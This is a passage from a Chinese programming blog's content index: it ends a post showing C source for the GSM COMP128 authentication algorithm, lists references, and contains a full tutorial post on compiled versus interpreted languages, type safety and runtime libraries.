*/</span></span><br><span class=\"line\">        _comp128_permutation(x, bits);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Round 8 (final) */</span></span><br><span class=\"line\">    <span class=\"comment\">/* x[0-15] = Ki */</span></span><br><span class=\"line\">    <span class=\"built_in\">memcpy</span>(x, ki, <span class=\"number\">16</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Compression */</span></span><br><span class=\"line\">    _comp128_compression(x);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Output stage */</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (i=<span class=\"number\">0</span>; i&lt;<span class=\"number\">8</span>; i+=<span class=\"number\">2</span>)</span><br><span class=\"line\">        sres[i&gt;&gt;<span class=\"number\">1</span>] = x[i]&lt;&lt;<span class=\"number\">4</span> | x[i+<span class=\"number\">1</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (i=<span class=\"number\">0</span>; i&lt;<span class=\"number\">12</span>; i+=<span class=\"number\">2</span>)</span><br><span class=\"line\">        kc[i&gt;&gt;<span class=\"number\">1</span>] = (x[i + <span class=\"number\">18</span>] &lt;&lt; <span class=\"number\">6</span>) |</span><br><span class=\"line\">                   (x[i + <span class=\"number\">19</span>] &lt;&lt; <span class=\"number\">2</span>) |</span><br><span class=\"line\">                   (x[i + <span class=\"number\">20</span>] &gt;&gt; <span class=\"number\">2</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    kc[<span class=\"number\">6</span>] = (x[<span class=\"number\">30</span>]&lt;&lt;<span class=\"number\">6</span>) | (x[<span class=\"number\">31</span>]&lt;&lt;<span class=\"number\">2</span>);</span><br><span class=\"line\">    kc[<span class=\"number\">7</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"keyword\">inline</span> <span class=\"type\">void</span> _comp128_compression(<span class=\"type\">uint8_t</span> *x)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> n;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (n=<span class=\"number\">0</span>; n&lt;<span class=\"number\">5</span>; n++)</span><br><span class=\"line\">        _comp128_compression_round(x, n, _comp128_table[n]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"keyword\">inline</span> <span class=\"type\">void</span> _comp128_bitsfrombytes(<span class=\"type\">uint8_t</span> *x, <span class=\"type\">uint8_t</span> *bits)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> i;</span><br><span class=\"line\">    <span class=\"built_in\">memset</span>(bits, <span class=\"number\">0x00</span>, <span class=\"number\">128</span>);</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (i=<span class=\"number\">0</span>; i&lt;<span class=\"number\">128</span>; i++)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (x[i&gt;&gt;<span class=\"number\">2</span>] &amp; (<span class=\"number\">1</span>&lt;&lt;(<span class=\"number\">3</span>-(i&amp;<span class=\"number\">3</span>))))</span><br><span class=\"line\">            bits[i] = <span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"keyword\">inline</span> <span class=\"type\">void</span> _comp128_permutation(<span class=\"type\">uint8_t</span> *x, <span class=\"type\">uint8_t</span> *bits)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> i;</span><br><span class=\"line\">    <span class=\"built_in\">memset</span>(&amp;x[<span class=\"number\">16</span>], <span class=\"number\">0x00</span>, <span class=\"number\">16</span>);</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (i=<span class=\"number\">0</span>; i&lt;<span class=\"number\">128</span>; i++)</span><br><span class=\"line\">        x[(i&gt;&gt;<span class=\"number\">3</span>)+<span class=\"number\">16</span>] |= bits[(i*<span class=\"number\">17</span>) &amp; <span class=\"number\">127</span>] &lt;&lt; (<span class=\"number\">7</span>-(i&amp;<span class=\"number\">7</span>));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://www.secrss.com/articles/36564\">移动通信网中的密码算法演进 (三)：认证篇</a></li>\n<li><a href=\"https://www.secrss.com/articles/36562\">移动通信网中的密码算法演进 (一)：机密性保护</a></li>\n<li><a href=\"https://www.secrss.com/articles/36563\">移动通信网中的密码算法演进 (二)：完整性保护</a></li>\n<li><a href=\"https://github.com/osmocom/libosmocore/blob/master/src/gsm/comp128.c\">COMP128算法源码 - Github</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/528866024\">GSM SIM卡算法COMP128生日攻击原理 - 知乎</a></li>\n<li><a href=\"https://blog.csdn.net/qq_31985307/article/details/115265685\">3GPP USIM milenage 算法代码</a></li>\n</ul>\n<h3 id=\"文档下载\"><a href=\"#文档下载\" class=\"headerlink\" title=\"文档下载\"></a>文档下载</h3><ul>\n<li><a href=\"5G%E7%BD%91%E7%BB%9C%E7%9A%84%E8%AE%A4%E8%AF%81%E4%BD%93%E7%B3%BB---%E9%BD%90%E9%B9%8F%E6%99%8F.pdf\">5G网络的认证体系—齐鹏晏</a></li>\n<li><a href=\"%E7%A7%BB%E5%8A%A8%E9%80%9A%E4%BF%A1%E7%BD%91%E9%89%B4%E6%9D%83%E8%AE%A4%E8%AF%81%E7%BB%BC%E8%BF%B0_%E8%83%A1%E9%91%AB%E9%91%AB.pdf\">移动通信网鉴权认证综述 - 胡鑫鑫</a></li>\n<li><a href=\"chinois.pdf\">COMP128算法分析中关键问题研究 - 汪涛</a></li>\n<li><a href=\"comp128-a-birthday-surprise-rev.pdf\">COMP128: A Birthday Surprise - Stuart Wray</a></li>\n</ul>\n"},{"title":"编译型语言和解释型语言的基本原理","url":"/2021/10/31/%E7%BC%96%E8%AF%91%E5%9E%8B%E8%AF%AD%E8%A8%80%E5%92%8C%E8%A7%A3%E9%87%8A%E5%9E%8B%E8%AF%AD%E8%A8%80%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/","content":"<h2 id=\"汇编语言-Assembly-Language\"><a href=\"#汇编语言-Assembly-Language\" class=\"headerlink\" title=\"汇编语言 - Assembly Language\"></a>汇编语言 - Assembly Language</h2><p>先看Wiki关于编译器的定义。</p>\n<blockquote>\n<p>In computing, a compiler is a computer program that translates computer code written in one programming language (the source language) into another language (the target language). The name “compiler” is primarily used for programs that translate source code from a high-level programming language to a lower level language (e.g. assembly language, object code, or machine code) to create an executable program.</p>\n</blockquote>\n<p>编译器（compiler）是一种计算机程序，它会将某种编程语言写成的源代码（原始语言）转换成另一种编程语言（目标语言）。换句话说，编译器就是一个翻译家，负责将一种语言转换为另一种语言，以便某种计算机系统能够理解并执行。</p>\n<p>对于计算机语言来说，无论是低级语言，还是高级语言，都是基于<strong>汇编语言</strong>（Assembly Language）来构建的。</p>\n<p>汇编语言是任何一种用于电子计算机、微处理器、微控制器，或其他可编程器件的低级语言。在不同的设备中，汇编语言对应着不同的机器语言指令集。一种汇编语言专用于某种计算机系统结构，而不像许多高级语言，可以在不同系统平台之间移植。</p>\n<blockquote>\n<p>目前市场上主流芯片的机器语言指令集包括：X86、ARM、RISC-V、MIPS等四种。<br>而HP的PA-RISC、IBM的PowerPC、DEC的Alpha、SUN的SPARC等指令集已经被淘汰。</p>\n</blockquote>\n<p>CPU机器语言的指令都是二进制的，称为操作码（opcode），比如加法指令就是<code>00000011</code>。对于人类来说，二进制程序是不可读的，根本看不出来机器干了什么。为了解决可读性的问题，以及偶尔的编辑需求，就诞生了汇编语言。<br>汇编语言是二进制指令的文本形式，与指令是一一对应的关系。比如，加法指令<code>00000011</code>写成汇编语言就是<code>ADD</code>。只要还原成二进制，汇编语言就可以被 CPU 直接执行，所以它是最底层的低级语言。</p>\n<img src=\"/2021/10/31/%E7%BC%96%E8%AF%91%E5%9E%8B%E8%AF%AD%E8%A8%80%E5%92%8C%E8%A7%A3%E9%87%8A%E5%9E%8B%E8%AF%AD%E8%A8%80%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/hbyy.jpg\" class=\"\">\n\n<p>汇编语言使用助记符（Mnemonics）来代替和表示特定低级机器语言的操作。特定的汇编目标指令集可能会包括特定的操作数。许多汇编程序可以识别代表地址和常量的标签（Label）和符号（Symbols），这样就可以用字符来代表操作数而无需采取写死的方式。普遍地说，每一种特定的汇编语言和其特定的机器语言指令集是一一对应的。<br>许多汇编程序为程序开发、汇编控制、辅助调试提供了额外的支持机制。有的汇编语言编写工具经常会提供宏，它们也被称为宏汇编器。</p>\n<h2 id=\"编译型语言-Compiled-Lanuage\"><a href=\"#编译型语言-Compiled-Lanuage\" class=\"headerlink\" title=\"编译型语言 - Compiled Lanuage\"></a>编译型语言 - Compiled Lanuage</h2><p>编译语言是一种高级编程语言类型，首先通过编译器（Compiler）将代码编译为机器代码，然后再加以运行。<br>在此过程中，编译器一次将整个程序转换为机器代码。如果有任何语法或语义错误，编译器将给出错误警告并退出，如果不纠正这些错误，就不可能执行程序。</p>\n<p><code>C</code>、<code>C++</code>、<code>Object C</code>都是典型的编译语言为例，而<code>gcc</code>、<code>Clang</code>等就是其编译器。</p>\n<blockquote>\n<p><code>GCC</code>（GNU Compiler Collection）是一套完整的开源编译器软件，包括编译器前端和后端，不仅支持<code>C</code>和<code>C++</code>，还可以支持<code>Java</code>、<code>Ada</code>和<code>Fortran</code>等多种语言。<br>Apple原来也采用<code>GCC</code>，但由于认为对其支持不力，而自行开发了<code>Clang</code>，并宣称编译速度有显著提高。<br>注意，<code>Clang</code>只是一个编译器前端，通常使用<code>LLVM</code>(Low Level Virtual Machine)作为编译器后端，<code>LLVM</code>利用虚拟技术使编译时期、链接时期、运行时期和闲置时期达到最优化，广泛支持多种语言的编译和优化。如果你准备开发自己的编译器，这是一个非常重要的基础组件。</p>\n</blockquote>\n<img src=\"/2021/10/31/%E7%BC%96%E8%AF%91%E5%9E%8B%E8%AF%AD%E8%A8%80%E5%92%8C%E8%A7%A3%E9%87%8A%E5%9E%8B%E8%AF%AD%E8%A8%80%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/code.png\" class=\"\">\n\n<p>以<code>cpp</code>语言开发为例，使用gcc生成可执行文件需要经历四个相互关联的步骤∶</p>\n<ul>\n<li>预处理(也称预编译，Preprocessing)：调用<code>cpp</code>进行预处理，对源代码文件(后缀一般为<code>.cpp</code>)中的文件包含(include)、预编译语句(如宏定义define等)进行分析</li>\n<li>编译(Compilation)：调用<code>cc1</code>进行编译，根据输入文件生成以<code>.o</code>为后缀的目标文件</li>\n<li>汇编(Assembly)：调用<code>as</code>进行工作，一般来讲，.S为后缀的汇编语言源代码文件和汇编、.s为后缀的汇编语言文件,经过预编译和汇编之后都生成以.o为后缀的目标文件</li>\n<li>连接(Linking)：在连接阶段，所有的目标文件被安排在可执行程序中的恰当的位置，同时，该程序所调用到的库函数也从各自所在的档案库中连到合适的地方</li>\n</ul>\n<img src=\"/2021/10/31/%E7%BC%96%E8%AF%91%E5%9E%8B%E8%AF%AD%E8%A8%80%E5%92%8C%E8%A7%A3%E9%87%8A%E5%9E%8B%E8%AF%AD%E8%A8%80%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/gcc.png\" class=\"\">\n\n<p>在Linux中，cpp代码编译中常见的文件名后缀包括：</p>\n<ul>\n<li><code>.i</code>是对源代码进行预处理后的中间文件，主要工作包括：处理宏定义、预编译指令、删除注释、添加行号和文件标识等</li>\n<li><code>.o</code>是编译中间目标文件，相当于win上的<code>.obj</code></li>\n<li><code>.a</code>是静态库文件，由多个<code>.o</code>文件链接得到，用于静态链接</li>\n<li><code>.so</code>是共享库文件，用于动态链接（shared object），相当于win上<code>.dll</code></li>\n</ul>\n<h2 id=\"解释型语言-Interpreted-language\"><a href=\"#解释型语言-Interpreted-language\" class=\"headerlink\" title=\"解释型语言 - Interpreted language\"></a>解释型语言 - Interpreted language</h2><p>解释语言（Interpreted language）是一种编程语言类型，会将代码一句一句直接运行，需要哪些源代码就转换哪些源代码，不会生成可执行程序，这种编程语言称为解释语言（Interpreted language），使用的转换工具称为解释器。</p>\n<p>解释器就像一位“中间人”，一边解释一边执行，因此依赖于解释器的程序运行速度比较缓慢。<br>解释器的好处是它不需要重新编译整个程序，从而减轻了每次程序更新后编译的负担。</p>\n<p>常见的解释语言的示例是<code>Basic</code>、<code>PHP</code>，<code>Ruby</code>，<code>Python</code>和<code>JavaScript</code>。</p>\n<p>以Basic为例，其代码和运行结果示例：</p>\n<figure class=\"highlight basic\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"symbol\">10 </span><span class=\"keyword\">INPUT</span> <span class=\"string\">&quot;What is your name: &quot;</span>, U$</span><br><span class=\"line\"><span class=\"symbol\">20 </span><span class=\"keyword\">PRINT</span> <span class=\"string\">&quot;Hello &quot;</span>; U$</span><br><span class=\"line\"><span class=\"symbol\">30 </span><span class=\"keyword\">INPUT</span> <span class=\"string\">&quot;How many stars do you want: &quot;</span>, N</span><br><span class=\"line\"><span class=\"symbol\">40 </span>S$ = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\"><span class=\"symbol\">50 </span><span class=\"keyword\">FOR</span> I = <span class=\"number\">1</span> <span class=\"keyword\">TO</span> N</span><br><span class=\"line\"><span class=\"symbol\">60 </span>S$ = S$ + <span class=\"string\">&quot;*&quot;</span></span><br><span class=\"line\"><span class=\"symbol\">70 </span><span class=\"keyword\">NEXT</span> I</span><br><span class=\"line\"><span class=\"symbol\">80 </span><span class=\"keyword\">PRINT</span> S$</span><br><span class=\"line\"><span class=\"symbol\">90 </span><span class=\"keyword\">INPUT</span> <span class=\"string\">&quot;Do you want more stars? &quot;</span>, A$</span><br><span class=\"line\"><span class=\"symbol\">100 </span><span class=\"keyword\">IF</span> <span class=\"keyword\">LEN</span>(A$) = <span class=\"number\">0</span> <span class=\"keyword\">THEN</span> <span class=\"keyword\">GOTO</span> <span class=\"number\">90</span></span><br><span class=\"line\"><span class=\"symbol\">110 </span>A$ = <span class=\"keyword\">LEFT$</span>(A$, <span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"symbol\">120 </span><span class=\"keyword\">IF</span> A$ = <span class=\"string\">&quot;Y&quot;</span> <span class=\"keyword\">OR</span> A$ = <span class=\"string\">&quot;y&quot;</span> <span class=\"keyword\">THEN</span> <span class=\"keyword\">GOTO</span> <span class=\"number\">30</span></span><br><span class=\"line\"><span class=\"symbol\">130 </span><span class=\"keyword\">PRINT</span> <span class=\"string\">&quot;Goodbye &quot;</span>; U$</span><br><span class=\"line\"><span class=\"symbol\">140 </span><span class=\"keyword\">END</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"关于类型安全（Type-Safety）的讨论\"><a href=\"#关于类型安全（Type-Safety）的讨论\" class=\"headerlink\" title=\"关于类型安全（Type Safety）的讨论\"></a>关于类型安全（Type Safety）的讨论</h2><p>尼古拉斯·沃斯的一个著名的公式：<code>程序 = 数据结构 + 算法</code>。<br>其中，数据是可以被记录或存储的信息，数据结构则说的是一种组织或存储数据的方式，而算法则是通过对输入的处理从而输出能解决问题的有效方法。<br>也就是说，任何一种编程语言，都需要为变量、常量、函数（方法）提供并定义数据类型（Type），本质就是提供一块内存的存储区域。</p>\n<p>类型错误（type error）是错误或不期望的程序行为，由不同数据类型的差别所引起，如把整型（int）当作了浮点型（float），由此可能引发数据越界而造成安全漏洞。<br>以C语言的指针类型为例，由于其类型定义不严格，非常容易引发数组溢出、堆栈溢出、缓冲区溢出、野指针（<code>void *p</code>）等安全问题，最终将指向内存的某个不可知区域造成系统崩溃或安全漏洞。</p>\n<p>为了解决类型安全问题，从不同的角度产生了多种方案，以下是几个较为常见的维度：</p>\n<h3 id=\"动态语言-Vs-静态语言\"><a href=\"#动态语言-Vs-静态语言\" class=\"headerlink\" title=\"动态语言 Vs 静态语言\"></a>动态语言 Vs 静态语言</h3><ul>\n<li><p>动态语言（Dynamic programming language）：是一类在运行时可以改变对象结构的语言：例如新的函数、对象、甚至代码可以被引进，已有的函数可以被删除或是其他结构上的变化。通俗点说就是在运行时代码可以根据某些条件改变自身结构。<br>主要动态语言：Object-C、JavaScript、PHP、Python、Erlang。</p>\n</li>\n<li><p>静态语言（Statically programming language）：与动态语言相对应的，运行时对象结构不可变的语言就是静态语言。如Java、C、C++、C#。</p>\n</li>\n</ul>\n<blockquote>\n<p>动态语言的常见特征有：eval函数、对象运行时修改属性或方法、反射和宏。<br>大部分动态语言都使用动态类型，但也有些不是。</p>\n</blockquote>\n<h3 id=\"强类型语言-Vs-弱类型语言\"><a href=\"#强类型语言-Vs-弱类型语言\" class=\"headerlink\" title=\"强类型语言 Vs 弱类型语言\"></a>强类型语言 Vs 弱类型语言</h3><ul>\n<li><p>强类型语言（Strong typing language）：即没有强制类型转化前，不允许两种不同类型的变量相互操作。<br>强类型语言包括：Java、.net、Python、C++等语言。其中Python是动态语言，是强类型定义语言，是类型安全的语言，Java是静态语言，是强类型定义语言，也是类型安全的语言。</p>\n</li>\n<li><p>弱类型语言（Weak typing language）：即变量定义时可以忽略数据类型，且该变量可以根据环境变化自动进行隐式类型转换，比如直接将整型变量与字符变量相加。<br>  弱类型语言包括：VB，PHP，JavaScript等语言。其中VBScript是动态语言，是一种类型不安全的原因。</p>\n</li>\n</ul>\n<p>强类型语言和弱类型原因其判断的根本是：<strong>是否会隐形进行语言类型转变</strong>。</p>\n<blockquote>\n<p>使用弱类型语言可节省很多代码量，有更高的开发效率。而对于构建大型项目，使用强类型语言可能会比使用弱类型更加规范可靠。</p>\n</blockquote>\n<h3 id=\"动态类型语言-Vs-静态类型语言\"><a href=\"#动态类型语言-Vs-静态类型语言\" class=\"headerlink\" title=\"动态类型语言 Vs 静态类型语言\"></a>动态类型语言 Vs 静态类型语言</h3><p>类型安全可以静态方式实施，及早在编译阶段（Compiling）就捕捉到潜藏的错误；或者以动态方式，推迟到运行时期（Runtime）检测即将发生的错误。</p>\n<ul>\n<li>动态类型语言（Dynamically Typed Language）：是指在运行期间才去做数据类型检查的语言。<br>在用动态语言编程时，不用给变量指定数据类型，该语言会在你第一次赋值给变量时，在内部将数据类型记录下来。Python和Ruby就是一种典型的动态类型语言；</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>a = <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"built_in\">type</span>(a)</span><br><span class=\"line\">&lt;<span class=\"built_in\">type</span> <span class=\"string\">&#x27;int&#x27;</span>&gt;</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>a = <span class=\"string\">&quot;s&quot;</span></span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"built_in\">type</span>(a)</span><br><span class=\"line\">&lt;<span class=\"built_in\">type</span> <span class=\"string\">&#x27;str&#x27;</span>&gt;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>静态类型语言（Statically Typed Language）：与动态类型语言刚好相反，它的数据类型检查发生在编译阶段，也就是说在写程序时要声明变量的数据类型。<br>C&#x2F;C++、C#、Java都是静态类型语言的典型代表，下面以C语言为例说明其原理：</li>\n</ul>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">char</span> hello[<span class=\"number\">20</span>] = <span class=\"string\">&quot;Hello world&quot;</span>;</span><br><span class=\"line\">    <span class=\"type\">char</span> result[<span class=\"number\">20</span>] = hello / <span class=\"number\">2</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    print(result);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"小结\"><a href=\"#小结\" class=\"headerlink\" title=\"小结\"></a>小结</h2><h3 id=\"1-编译器和解释器的核心差异在于是否编译和执行过程是否是同时进行\"><a href=\"#1-编译器和解释器的核心差异在于是否编译和执行过程是否是同时进行\" class=\"headerlink\" title=\"1. 编译器和解释器的核心差异在于是否编译和执行过程是否是同时进行\"></a>1. 编译器和解释器的核心差异在于是否编译和执行过程是否是同时进行</h3><p>编译器所干的事，将一门语言 X 编译为另一门语言 Y （可以是语言 X、高级语言、低级语言等），整个编译过程涉及词法分析、语法分析、语义分析。该过程往往由程序员在编写程序时完成。<br>而解释器则直接将语言 X 编写的程序在目标机器上运行，并输出解释后运行的结果。</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\"></th>\n<th align=\"center\">编译器 - Compiler</th>\n<th align=\"center\">解释器 - Interpreter</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">典型产品</td>\n<td align=\"center\">gcc、VC</td>\n<td align=\"center\">Basic，bash</td>\n</tr>\n<tr>\n<td align=\"center\">优化目标</td>\n<td align=\"center\">更快的运行速度</td>\n<td align=\"center\">更少的内存占用</td>\n</tr>\n<tr>\n<td align=\"center\">外部存储</td>\n<td align=\"center\">必须的</td>\n<td align=\"center\">可选的</td>\n</tr>\n<tr>\n<td align=\"center\">错误检查</td>\n<td align=\"center\">运行前的编译阶段</td>\n<td align=\"center\">程序运行过程中</td>\n</tr>\n<tr>\n<td align=\"center\">源代码</td>\n<td align=\"center\">直接运行二进制机器码</td>\n<td align=\"center\">运行环节必须依赖源代码</td>\n</tr>\n<tr>\n<td align=\"center\">运行环境</td>\n<td align=\"center\">操作系统提供的Runtime Library</td>\n<td align=\"center\">必须依赖于解释器</td>\n</tr>\n<tr>\n<td align=\"center\">跨平台支持</td>\n<td align=\"center\">维护不同版本的源代码，并需要编译环节</td>\n<td align=\"center\">通过解释器（或虚拟机）适配不同平台，源代码无需修改</td>\n</tr>\n<tr>\n<td align=\"center\">运行效率</td>\n<td align=\"center\">安装（编译）速度慢，运行速度快</td>\n<td align=\"center\">启动速度快，运行速度慢</td>\n</tr>\n</tbody></table>\n<h3 id=\"2-随着虚拟机技术的发展，越来越多的现代语言同时采用了编译技术和解释技术\"><a href=\"#2-随着虚拟机技术的发展，越来越多的现代语言同时采用了编译技术和解释技术\" class=\"headerlink\" title=\"2. 随着虚拟机技术的发展，越来越多的现代语言同时采用了编译技术和解释技术\"></a>2. 随着虚拟机技术的发展，越来越多的现代语言同时采用了编译技术和解释技术</h3><p>需要注意的是，随着计算机技术的发展，编译器的目标代码已经不仅是机器代码（Machine code），还可能是某种虚拟机（Viutual Machine）所支持的字节码（Bytecode），编译器和解释器正在不断地融合发展。</p>\n<p>以<code>Java</code>为例，就是同时使用了编译技术和解释技术，<code>JavaScript</code>也从客户端浏览器运行的脚本语言发展为高效复杂的V8引擎驱动。在智能终端方面，<code>Android</code>先后采用了<code>Dalvit</code>和<code>ART</code>等不同类型的编译器，华为更是基于方舟编译器推出了<code>Harmoney</code>操作系统。</p>\n<p>后续我们还将深入探讨编译技术的最新发展。</p>\n<h3 id=\"3-尽管存在争议，动态语言在开发效率的巨大优势使之成为现代高级语言的必然趋势\"><a href=\"#3-尽管存在争议，动态语言在开发效率的巨大优势使之成为现代高级语言的必然趋势\" class=\"headerlink\" title=\"3. 尽管存在争议，动态语言在开发效率的巨大优势使之成为现代高级语言的必然趋势\"></a>3. 尽管存在争议，动态语言在开发效率的巨大优势使之成为现代高级语言的必然趋势</h3><p>我们讨论了许多编程语言的类型安全问题，以下是一个粗糙的示意图，仅供参考。</p>\n<img src=\"/2021/10/31/%E7%BC%96%E8%AF%91%E5%9E%8B%E8%AF%AD%E8%A8%80%E5%92%8C%E8%A7%A3%E9%87%8A%E5%9E%8B%E8%AF%AD%E8%A8%80%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/type.jpg\" class=\"\">\n\n<p>可以肯定的是，动态语言对于Runtime环境的依赖越来越高，未来跨CPU平台的需求重要性也将越来越重要。</p>\n<hr>\n<h2 id=\"附录一：运行时库-Runtime-library\"><a href=\"#附录一：运行时库-Runtime-library\" class=\"headerlink\" title=\"附录一：运行时库 - Runtime library\"></a>附录一：运行时库 - Runtime library</h2><p>运行时库（<code>Runtime library</code>，又称运行时库），在计算机程序设计领域中，是指编程语言程序运行时（执行）所需要的一种特殊的计算机程序库，编译器会调用运行时库至已编译的可执行二进制代码中。这种库一般包括基本的输入输出或是内存管理等支持。它是一群支持正在运行程序的函数，与操作系统合作提供诸如数学运算、输入输出等功能，让程序写作者不需要“重新发明轮子”，并善用操作系统提供的功能。</p>\n<p>运行时库由编译器决定，以面向编程语言，提供其最基本的执行时需要。比如<code>Visual Basic</code>需要复杂的运行时库支持而<code>C</code>的运行时库则相对简单。当然这还是由编译器厂商决定的。运行时库中的函数可能对程序员透明，也可能不透明。这也是由编译器厂商对语言执行环境的需求而决定的。</p>\n<p>早期的运行期库（例如<code>Fortran</code>）提供了数学运算能力。其他语言增加了诸如垃圾回收的先进功能，用于支持对象数据结构。许多近代语言设计了更大的运行环境并添加更多功能。很多面向对象语言也包含了分派器与类别读取器。<code>Java</code>虚拟机（JVM）便是此类的典型运行环境：它也在运行期直译或编译具可携性的二进制<code>Java</code>程序。而<code>.NET</code>架构也是另外一个运行时库的实例。</p>\n<p>以<code>C</code>语言为例，其运行时库称为C Run-Time library，简称为<code>CRT</code>。<br>由于<code>C</code>语言其是所谓的<strong>小内核</strong>语言，就其语言本身来说很小（不多的关键字，程序流程控制，数据类型等）。所以，<code>C</code>语言内核开发出来之后，Dennis Ritchie 和 Brian Kernighan 就用<code>C</code>本身重写了 90% 以上的 UNIX 系统函数，并且把其中最常用的部分独立出来，形成头文件和对应的库文件，<code>C Run-Time library</code>（简称<code>CRT</code>）就是这样形成的。</p>\n<p><code>C run-time library</code>里面含有初始化代码，还有错误处理代码(例如divide by zero处理)。你写的程序可以没有<code>math</code>库，程序照样运行，只是不能处理复杂的数学运算，不过如果没有了<code>C run-time</code>库，<code>main()</code>就不会被调用，<code>exit()</code>也不能被响应。因为<code>C run-time library</code>包含了C程序运行的最基本和最常用的函数。</p>\n<p><code>CRT</code>和操作系统密切相关，从某种程度上来讲是，<code>CRT</code>是语言程序和不同操作系统平台之间的抽象层（接口是统一的标准，实现由各个平台自己实现）。</p>\n<h3 id=\"Linux：glibc（GNU-C-Library）\"><a href=\"#Linux：glibc（GNU-C-Library）\" class=\"headerlink\" title=\"Linux：glibc（GNU C Library）\"></a>Linux：<code>glibc</code>（GNU C Library）</h3><p>在Linux平台上最广泛使用的C运行库是<code>glibc</code>，其中包括C标准库的实现，也包括所有系统函数，并在其基础上增加了线程操作等扩展。<br>几乎所有C程序都要调用<code>glibc</code>的库函数，基本上除了Linux自身的API以外，所有的库都依赖于<code>glibc</code>，所以<code>glibc</code>是Linux平台C程序运行的基础。</p>\n<p><code>glibc</code>的动态库文件位于<code>/lib/libc.so.6</code>,静态库文件位于<code>/usr/lib/libc.a</code></p>\n<h3 id=\"Windows：MSVCRT（Microsoft-Visual-C-Run-time）\"><a href=\"#Windows：MSVCRT（Microsoft-Visual-C-Run-time）\" class=\"headerlink\" title=\"Windows：MSVCRT（Microsoft Visual C Run-time）\"></a>Windows：<code>MSVCRT</code>（Microsoft Visual C Run-time）</h3><p>在Windows环境下，<code>Visual C</code>提供的运行时库又分为动态运行时库和静态运行时库（注意：动态链接库或静态链接库与运行时库的分类角度不同，不得相提并论）。：</p>\n<ul>\n<li>动态运行时库：主要是DLL库文件<code>MSVCRT.DLL</code>(or MSVCRTD.DLL for debug build)，<br>对应的Import library文件是<code>MSVCRT.LIB</code>(MSVCRTD.LIB for debug build)</li>\n<li>静态运行时库：对应的主要文件是：<br><code>LIBC.LIB</code> (Single thread static library, retail version)<br><code>LIBCMT.LIB</code> (Multithread static library, retail version)</li>\n</ul>\n<h2 id=\"附录二：静态链接-Vs-动态链接\"><a href=\"#附录二：静态链接-Vs-动态链接\" class=\"headerlink\" title=\"附录二：静态链接 Vs 动态链接\"></a>附录二：静态链接 Vs 